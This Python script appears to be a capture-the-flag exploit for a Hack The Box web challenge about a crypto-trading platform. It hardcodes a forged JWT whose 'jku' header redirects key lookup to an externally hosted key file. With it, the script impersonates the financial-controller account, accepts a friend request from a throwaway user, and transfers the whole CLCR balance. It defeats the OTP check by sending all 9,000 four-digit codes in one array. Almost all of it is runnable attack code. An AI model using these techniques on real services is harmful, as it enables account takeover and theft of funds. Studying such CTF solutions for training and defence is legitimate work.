import requests, datetime, os

HOST = 'http://94.237.60.154:54864'
FINANCIAL_EMAIL = 'financial-controller@frontier-board.htb'
COIN_SYMBOL = 'CLCR'

def create_forged_jwt():
    '''(ﾉ◕ヮ◕)ﾉ*:･ﾟ✧'''
    token='eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly8xMjcuMC4wLjE6MTMzNy9hcGkvYW5hbHl0aWNzL3JlZGlyZWN0P3VybD1odHRwczovL3RlbXAuc3RhdGljc2F2ZS5jb20vNjc1YzRkM2Q1NWZhYy5qc29uJnJlZj0wIiwia2lkIjoiZDhlMTJiMzAtYTRhYi00NDJhLWJiMTYtNDI1ZTA2MjIwNTc2IiwidHlwIjoiSldUIn0.eyJlbWFpbCI6ImZpbmFuY2lhbC1jb250cm9sbGVyQGZyb250aWVyLWJvYXJkLmh0YiIsImlhdCI6MTczNDEzMzEzMS44MjI2NDV9.XNn0jasIFurrnV7rg0DEK6VcGGWQT24bqOkkMF5aJKCXjfGq-8LWnnYzf9xGW6g8_hHk7PR1034GEJ4kmWnYfLqthwLHjJ_82iDw6W63U-vCookxAbiZA4WDq2-pbyn_LGATAeAdPO4SQJPL8_Y0ubLrinCTTCdFHfjxR8jhnXldSe3dTqFd7SItDCoORxnkA4oSU__vQqJ_Z_4Bk1eCLCNomSbRxtMRBIBN9pDOJ4DiZNtNaPSGCJXXXCetAzKuJlqZA8yWPMXUvHHVwVOF762574S7wS1sWkxD8f6Twe105M9e9RPEV3Stnic0hCunsqpwfkKw8fHT6d1fJPzNVA'
    return token

def validate_token(token):
    response = requests.get(f'{HOST}/api/dashboard', headers={'Authorization': f'Bearer {forged_token}'})
    if response.status_code == 200:
        print('[+] JWT validation successful! Response:')
        print(response.json())
    else:
        print(f'[!] JWT validation failed. Status: {response.status_code}, Response: {response.text}')

forged_token = create_forged_jwt()
print(f'[~] Forged JWT: {forged_token}')

print('[+] Validating forged JWT against /api/dashboard...')
validate_token(forged_token)

def register_user(email, password):
    user = {'email': email, 'password': password}
    r = requests.post(
        f'{HOST}/api/auth/register', 
        json=user
    )
    if r.status_code == 200:
        print(f'User registered successfully: {email}')
    else:
        print(f'Failed to register user: {email}, Response: {r.text}')

def login_user(email, password):
    user = {'email': email, 'password': password}
    r = requests.post(
        f'{HOST}/api/auth/login', 
        json=user
    )
    if r.status_code == 200:
        data = r.json()
        token = data['token']
        print(f'Login successful for: {email}, Token: {token}')
        return token
    else:
        print(f'Login failed for: {email}, Response: {r.text}')
        return None

def send_friend_request(token, to_email):
    r = requests.post(
        f'{HOST}/api/users/friend-request',
        json={'to': to_email},
        headers={'Authorization': f'Bearer {token}'}
    )
    if r.status_code == 200:
        print(f'Friend request sent to: {to_email}')
    else:
        print(f'Failed to send friend request to {to_email}: {r.text}')

def fetch_friend_requests(token):
    r = requests.get(
        f'{HOST}/api/users/friend-requests',
        headers={'Authorization': f'Bearer {token}'}
    )
    if r.status_code == 200:
        requests_data = r.json()
        print('Pending friend requests:', requests_data.get('requests', []))
    else:
        print(f'Failed to fetch friend requests: {r.status_code} {r.text}')

def accept_friend_request(token, from_email):
    r = requests.post(
        f'{HOST}/api/users/accept-friend',
        json={'from': from_email},
        headers={'Authorization': f'Bearer {token}'}
    )
    if r.status_code == 200:
        print(f'Friend request from {from_email} accepted.')
    else:
        print(f'Failed to accept friend request from {from_email}: {r.text}')

def fetch_balance(token):
    r = requests.get(
        f'{HOST}/api/crypto/balance', 
        headers={'Authorization': f'Bearer {token}'}
    )
    if r.status_code == 200:
        balances = r.json()
        for coin in balances:
            if coin['symbol'] == COIN_SYMBOL:
                print(f'Balance for {COIN_SYMBOL}: {coin["availableBalance"]}')
                return coin['availableBalance']
        else:
            print(f'Failed to fetch balances: {r.text}')
    return 0

def make_transaction(token, to_email, coin, amount,):
    '''（ミ￣ー￣ミ）'''
    otp_list = [str(i) for i in range(1000, 10000)]
    r = requests.post(
        f'{HOST}/api/crypto/transaction',
        json={'to': to_email, 'coin': coin, 'amount': amount, "otp": otp_list},
        headers={'Authorization': f'Bearer {token}'}
    )
    if r.status_code == 200:
        print(f'Transaction of {amount} {coin} to {to_email} completed successfully.')
    else:
        print(f'Failed to make transaction to {to_email}: {r.text}')

def fetch_flag(token):
    r = requests.get(f'{HOST}/api/dashboard', headers={'Authorization': f'Bearer {token}'})
    if r.status_code == 200:
        data = r.json()
        if 'flag' in data:
            print(f'Flag: {data["flag"]}')
        else:
            print('Flag not found in the response.')
    else:
        print(f'Failed to fetch dashboard: {r.text}')

dummy_user = {'email': f'{os.urandom(10).hex()}@htb.com', 'password': '1337'}

register_user(dummy_user['email'], dummy_user['password'])

dummy_token = login_user(dummy_user['email'], dummy_user['password'])

if dummy_token:
    send_friend_request(dummy_token, FINANCIAL_EMAIL)

financial_token = forged_token

if financial_token:
    fetch_friend_requests(financial_token)
    accept_friend_request(financial_token, dummy_user['email'])

if financial_token and dummy_token:
    cluster_credit_balance = fetch_balance(financial_token)
    if cluster_credit_balance > 0:
        make_transaction(financial_token, dummy_user['email'], COIN_SYMBOL, cluster_credit_balance)

    fetch_flag(financial_token)
    
